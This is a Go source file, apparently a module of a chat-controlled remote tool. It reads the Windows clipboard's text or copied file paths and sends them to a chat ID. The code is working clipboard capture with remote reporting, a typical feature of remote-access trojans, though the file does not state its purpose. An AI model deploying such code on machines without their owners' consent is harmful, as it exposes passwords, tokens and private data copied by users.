//go:build clip

package main

import (
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	CF_UNICODETEXT = 13
	CF_HDROP       = 15
)

type DROPFILES struct {
	pFiles uintptr
	pt     POINT
	fNC    int32
	fWide  int32
}

type POINT struct {
	X, Y int32
}

func getClipboard(chatID int64) {
	// Thanks to https://github.com/golang-design/clipboard/blob/b50badc062a526673961e1465a673e3f3dfc1464/clipboard_windows.go#L299C1-L302C32
	// On Windows, OpenClipboard and CloseClipboard must be executed on
	// the same thread. Thus, lock the OS thread for further execution.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var responseStr string

	// Open the clipboard
	ret, _, _ := openClipboard.Call(0)
	if ret == 0 {
		SendMessage(chatID, "Could not open clipboard")
		return
	}
	defer closeClipboard.Call()

	// Try to get text data
	h, _, _ := getClipboardData.Call(uintptr(CF_UNICODETEXT))
	if h != 0 {
		responseStr = getTextFromHandle(h)
		if responseStr != "" {
			SendMessage(chatID, responseStr)
			return
		}
	}

	// If text data failed, try to get file paths
	h, _, _ = getClipboardData.Call(uintptr(CF_HDROP))
	if h != 0 {
		responseStr = getFilePathsFromHandle(h)
		if responseStr != "" {
			SendMessage(chatID, responseStr)
			return
		}
	}

	SendMessage(chatID, "Could not retrieve clipboard data")
}

func getTextFromHandle(h uintptr) string {
	ptr, _, _ := globalLock.Call(h)
	if ptr == 0 {
		return ""
	}
	defer globalUnlock.Call(h)

	return windows.UTF16PtrToString((*uint16)(unsafe.Pointer(ptr)))
}

func getFilePathsFromHandle(h uintptr) string {
	ptr, _, _ := globalLock.Call(h)
	if ptr == 0 {
		return ""
	}
	defer globalUnlock.Call(h)

	dropFiles := (*DROPFILES)(unsafe.Pointer(ptr))
	if dropFiles.fWide == 0 {
		return "ANSI paths not supported"
	}

	// Get the pointer to the file list
	fileListPtr := uintptr(ptr) + uintptr(dropFiles.pFiles)

	var filePaths []string
	for {
		filePath := windows.UTF16PtrToString((*uint16)(unsafe.Pointer(fileListPtr)))
		if filePath == "" {
			break
		}
		filePaths = append(filePaths, filePath)
		fileListPtr += uintptr(2 * (len(filePath) + 1)) // Move to the next file path
	}

	return fmt.Sprintf("Copied files:\n%s", strings.Join(filePaths, "\n"))
}
